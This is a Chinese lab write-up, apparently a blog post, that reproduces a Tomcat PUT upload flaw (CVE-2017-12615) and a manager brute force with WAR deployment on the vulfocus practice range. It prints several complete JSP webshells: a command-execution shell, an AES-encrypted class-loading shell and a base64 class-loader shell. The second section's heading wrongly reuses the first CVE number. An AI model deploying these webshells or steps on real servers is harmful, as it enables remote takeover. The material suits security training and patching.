#  vulfocus/tomcat漏洞复现  
原创 南棋子
                    南棋子  南棋子网络安全盟   2026-10-12 03:07  
  
我用的是https://vulfocus.cn在线靶场练习  
# TOMCAT任意文件上传漏洞（CVE-2017-12615）  
## 漏洞简介  
  
Tomcat的7.0.0 - 7.0.79（7.0.81修复不完全）版本存在一个任意文件上传漏洞，漏洞编号CVE-2017-12615。该漏洞的形成有一部分是因为Tomcat配置不当，启用了PUT的方法（例如将readonly参数由初始值设置为false），这样就会允许未经验证身份的用户上传文件。攻击者就可以利用这一点来上传webshell，导致上传文件中的恶意JSP代码执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiay6OWjcLIfYKkdyib9dJWckEqoG7tY9Q5s4IubvzzvlSH7B55aLe6uSeLtWKyiapic33aVnsvfOuiboAgfx3o3Wyb4IvqXktdReulw/640?wx_fmt=png&from=appmsg "")  
  
vulfocus漏洞环境启动  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiaw8zjeUhchM1dbicRZgyo7edibBPQMmICYnzeG6Nib6ztbj0w21UWT9wyvMAviceKnYEhicIcydc1q2bqbVBg9JiaJ0ZjpHib9VaIVf6I/640?wx_fmt=png&from=appmsg "")  
## 影响版本  
  
Apache Tomcat 7.0.0 – 7.0.81  
## 漏洞实战步骤  
  
先抓取一个访问该站点的数据包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiawN6YJY8cppBCWRiaj8plDWdTzREiae35dkCQGQRpeKg3I4460G7BklCcYXzdrJaHEwFGb2w8lmHwQrqlOqbz8licDSy0YbWZID6I/640?wx_fmt=png&from=appmsg "")  
  
测试是否允许PUT方法  
  
修改请求方式为OPTIONS /xx  HTTP/1.1，通过修改后发现允许PUT方法。注意/后面随意写点，我测试了多次都行。注意方法一定要大写，小写无效的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiayZnsHia5ctlIzCeNq1jZFCreBeib7Hgy1pW5mDvPwpTchCydBDRQmIsoXjtUrZaQgvHdM68Xd5ibJaW1e3MiahIXr6HcvmYhRSv0I/640?wx_fmt=png&from=appmsg "")  
  
将数据包发送到Repeater模块，将数据包中的OPTIONS方法改为PUT，注意方法一定要大写，小写无效的。  
  
访问的URL改成我们想要上传的文件名称，注意，在这里要在最后加上一个斜杠，否则上传会报错，因为/可以使绕过路径解析限制，让Tomcat将文件名视为目录，从而允许上传的内容被正确写入。还可以避免直接解析文件名，防止因路径格式问题导致的上传失败。在数据包的最后，加上PUT的内容，就是我们要上传的文件中的内容，构造完成后的数据包。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiaxPztVX1l0IN0VS4D547O4jVgza83V97pWqWHicrTppJic7Qq1IUcoia56xnXUFrTNQKfXXrGcB36YbxwickcdBIufnw0Or5iaE6YJY/640?wx_fmt=png&from=appmsg "")  
  
从上图中可以看出，我们发送上传后的数据包后，发现201的回显，这证明我们的文件上传成功！  
  
我们可以访问我们上传后的文件（注意要去掉最后的斜杠），发送可以成功访问  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiayvAgKpyZefGsZWm6MEbMjgH3s1qpYOfnzDKWvQ5MYibLdCSsCnsklnAzDo8sDd2Fv0KFnNHCHvePiaicoQHUAOw5b0PbcT6vh5q4/640?wx_fmt=png&from=appmsg "")  
  
如果目标服务器是Windows系统，可以利用文件名特性（如test.jsp::$DATA）绕过限制，我们可以把文件名称后的斜杠换成%20或者是::$DATA，可以起到同样的效果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaw0wG1Qvj3Tb8MlvTopqUiaqtIRs9rAWiaV8vFGBArPiayp5Ig6GNX9txuAFicNteYBI4OshCVX8OajKpVEYIfNldPJPbqhzgqNEK4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiazSA59iadAHJ6Eo20NsKKkmIGK7lFFib63GGT0bWch0McgUvoCuVSq4KHr5c7bicjr07icUd2Oboiac8lHJo32gwfdNoMHczibiaxzndo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiawsNBRgiatvIM2QIct9UVibialQVicYluQcJp91wVkuQkicYtT9x9lJHHsRekDU8NPowiaticYojicZx9UMXlo5TJibkrPibeafpzPLKTFes/640?wx_fmt=png&from=appmsg "")  
  
现在将上传测试内容换成JSP的带回显的木马  
  
<%  
  
java.io.InputStream is = Runtime.getRuntime()  
  
.exec(request.getParameter("command"))  
  
.getInputStream();  
  
int a = -1;  
  
byte[] b = new byte[2048];  
  
while ((a = is.read(b)) != -1) {  
  
out.print(new String(b));  
  
}  
  
%>  
  
将木马上传的数据包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiaySpxdonPBrBTXcCWa213CDdqgF4xDtIkhn0NU5tNJjSAenpndqIdbObrxZxL5E5Bbd8GeclpiaibKSZos9Y6TISV7Qe8XCebcibQ/640?wx_fmt=png&from=appmsg "")  
  
然后就可以访问一下url发现可以通过command参数的控制来执行任意系统命令了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiaxC9tdKxK7crMAEpcQobjtryBPD9axWSSNOHGWJwfs0ntFECEPmKnGclOkchs6jxsWRr1tpDDiawCHfgzmic4fXEKsGQ8ngPEyKo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiayBwsTnIEicKJJmaPiaqzw8W7MMTdicwotWJfLY2NXLcdeMfQiaHiaUomiaU1eTYWs3RfPv1FcMPQgcKzqEMtcIpiaiaOSneq0qicP6kMCY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaxqnuaId79icQsfiboS9TrJUnuCZib3gHdSeibKfnNZV52jDMFavLuSq7J3eiasucYd0jpePFdOgian0C1WqFiaEeWjzTHAjaF35DLicGc/640?wx_fmt=png&from=appmsg "")  
  
这个是我获取flag的代码  
  
<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}  
  
%>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiaz5qDst77FUzlQbmL2xxguaPkXfVZ4St1Yss4z4UUvia6CutxBxHNyU2coxia3dWwJGeLpdG9icI8KeGLeCkVtn9oyfEsOwy4vnbI/640?wx_fmt=png&from=appmsg "")  
  
进入根目录下然后找到tmp目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiaxuJ1LFKchAx6Is8gm5B9qbCZzavK4NwWSibohhahSjOkR0qWlgiaDvXWEDXPjDYN0YhgVHLWk73pYqGh8sYk7Q61aUib0zHLMH9c/640?wx_fmt=png&from=appmsg "")  
## 修复建议  
  
将readonly的值改为true即可防止该漏洞  
  
修改web.xml中readonly的值为true  
# TOMCAT弱口令&war部署getshell（CVE-2017-12615）  
## 漏洞介绍  
  
tomcat是一个用于快速部署jsp网站的中间件  
  
tomcat默认的管理页面manager使用basic认证用户名密码登录，可以使用burp进行爆破，并且一般安装后如果不修改/conf/tomcat-users.xml文件中的默认用户名密码tomcat:tomcat,可以登录管理后台，在部署war包后tomcat默认会将war包中的项目部署，由于可以任意的上传，所以我们可以将jsp文件打包为一个war文件上传getshell。  
  
vulfocus漏洞环境启动  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiazqAW7oPSFqBO42sDrsTchHPNpKP2q9twwBAJ1hbialsTmQ2xFeZ1Zok1C41bgLMuaUGxKphLA8LQibicyuaFDbMAOlMEmNORehh4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaxmXLK1BHiba0K9hiafzHBeuFjpbz4RKoVKvdmqRDYZWcmicW7wLtCztmTMb0elPdCKib4MeGcPbHDxKib9xDu6ZBKdC7ibxbuIaRUFY/640?wx_fmt=png&from=appmsg "")  
## 影响版本  
  
全版本(前提是人家存在弱口令)  
## 漏洞实战步骤  
  
我在用火狐的时候burp抓不到包，改为burp内置浏览器可以了  
  
随便输入用户名+密码，bp抓包，可以看到用户名+密码被base64加密放在了Authorization里  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiaynHQSbeFyaicKKg7CtU5fDmKMuzISYE1obibXvFw9TpF81CSvXyYpfibAT6SagzOibnxYH59ibicja2Cu7ZL0PuaWurf8h6aeqJzTyc/640?wx_fmt=png&from=appmsg "")  
  
Authorization里面的编码是base64解码，账户名解密出是admin/123456  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaysVAxzTevmTjuTbxlleVxVsatdcibokHM3SUxx6hkQhk5cwqB9Mesx5GoDtMUiaybJfbhC3NcYicu2WRLI3zuuyqukQxqVgyYNj0/640?wx_fmt=png&from=appmsg "")  
  
发送到inturder中，这里需要添加三个参数并且拼接到一起，最好的方式是使用自定义迭代的方法，因为要分成三个地方才可以进行爆破。  
  
格式为: 用户名、:密码，然后提交的时候进行base64加密，这里我们使用默认模式sniper（狙击手），然后选中刚才的加密字段  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaytcg4Q2Sz8ibrbpjbzRXWLXjo6bSR6kdml71fmYO9ibpeqnSBJzWQj0ib2ib5X40HToZ6UQK9zyXvgPBaBIUYmD1BaTuOzmpvE4n8/640?wx_fmt=png&from=appmsg "")  
  
配置每个位置的值，注意这里每个用户名变量都使用自定义迭代器  
  
第一个就是用户名变量，由于这里我们知道用户和密码，只是做一些爆破测试，手动加入一些常见的用户名，选择位置为1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiawB9g8Nx1JxrYKqN76GufZhy7s7maEmc8xIYWL10TwljzDhjjP7PnDicsmFvjibXtYSnKblwIrgVEM6blUZQEmictKXhXPp4lLxzo/640?wx_fmt=png&from=appmsg "")  
  
第二个变量是用户名和密码的分解符，所以直接加入:即可，选择位置2  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiawGcIYiadMC80EjbR6whzjKd1Y9icTyevrJ6qyx31WtdxHgJB9AFXrTicKibEPdswsVWibia1OUWyxZtHt5w9lNo4MencESG2Emr1hOg/640?wx_fmt=png&from=appmsg "")  
  
第三个变量是密码变量，手动加入一些密码测试爆破,选择位置3  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaxVNznpzEqibkOg5NpP9bMyASJEHy1iaxfJ3iadic9Kl95d5nvEHu0vp0f0FOUqicIicibKL0eokmdh6boibmWRsB3JJEWQlUzpqr5ZCib0/640?wx_fmt=png&from=appmsg "")  
  
取消默认将参数值进行url编码，进行base64编码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaxxJWhZRmtPyDQXl3yRrbvgGcA3gAgXNNmzaW2rM5YuJVfsibA0DR8NTRbTj2JkzcMiaZlM2Dh4sbLOm2fs6fgNSa5rCZHMhCT90/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiayYzztrGQibYyIAv6dSeJKU27lnRcNKVV54tOBGVriahjibjictJohdaJdSxOrzqGnBPK1wQaHBWibuKzLicHj8Eicc27lklwjCdEo1dU/640?wx_fmt=png&from=appmsg "")  
  
通过状态码为200表示爆破成功，我们进行base64解密后台用户名密码就是tomcat:tomcat  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiay5H8Hk4uSCVgUT5zia647rLExq5rRjbicVbHLZp6VibeBJt2FLZF9Rx7WNdutZTSPIvB6zyl6m7TeEojks3Sydd7axSic0Gv3c938/640?wx_fmt=png&from=appmsg "")  
  
创建一个tt.jsp文件  
  
<%!  
  
class U extends ClassLoader {  
  
U(ClassLoader c) {  
  
super(c);  
  
}  
  
public Class g(byte[] b) {  
  
return super.defineClass(b, 0, b.length);  
  
}  
  
}  
  
public byte[] base64Decode(String str) throws Exception {  
  
try {  
  
Class clazz = Class.forName("sun.misc.BASE64Decoder");  
  
return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);  
  
} catch (Exception e) {  
  
Class clazz = Class.forName("java.util.Base64");  
  
Object decoder = clazz.getMethod("getDecoder").invoke(null);  
  
return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);  
  
}  
  
}  
  
%>  
  
<%  
  
String cls = request.getParameter("passwd");  
  
if (cls != null) {  
  
new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);  
  
}  
  
%>  
  
使用jar cvf  tt.war  tt.jsp打包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaz7IfzRCcETvuTkdXafGG1m0MN7CJWIoFN2sf2PL0u8OtUrUW1y8OnlfCEHJ1X40GANAfroXmcezptLe6lpP94yucCQ1WicNKSE/640?wx_fmt=png&from=appmsg "")  
  
爆破成功之后登陆进入后台，将tt.war上传后tomcat直接会部署该项目，根据文件名生成一个目录，并将我们打包的tt.jsp放到目录中，所以只需要访问tt/tt.jsp即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiay2GeuUOmhmsaQiadJxS6y0ryVBuww8YeX2Yrt5StOAOKuTmR6dzKTprFpTAm2lBDXsfazGJovsXMHibN0MM2k4ENqh528wojpH4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaw07cnicjKia5oe2nFhcLUEkY4Cx7jbz8vE6fY3ticZwXV6rPxsXaradNFvYo3RQKeHOOjPYNNUibc9RfNEQPIiczZlHxaaT3y01Riao/640?wx_fmt=png&from=appmsg "")  
  
访问成功，空白页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaz43qvK5hrmVz7CS2wI8qkulnd8ia14qrjrxsQ3XlGmxygJNnVw61UUvyFShKEnBOj4ibDwjBQQiazRawvUricsYRfVG8mC82mqPkc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A7KFLCCUhiazXUKMfqgK1FrK8r4J3ianaP7UGEqUXlPaoSEAnSOQ5LlpUiccfce6D0zIpcEZA2xsM8ZZdrRNrgzhjS5Ujrys2lPiapVIe55OnDA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/A7KFLCCUhiaxfG4aSibdaWNssNup0DrE2H76TpJ61ylyOsicibKl3iaEWT2Wpk7ZicGicupgLQaLNX3VvX3QX2DwYfWCibkSJoBzicFkEcMnOLPCkgqQ/640?wx_fmt=png&from=appmsg "")  
## 漏洞修复建议  
  
将conf/tomcat-users.xml中的用户名和密码都进行更改，改的极其复杂，更改后记得重启服务器  
  
2. 将manager目录下的功能暂时关闭，需要的时候打开  
  
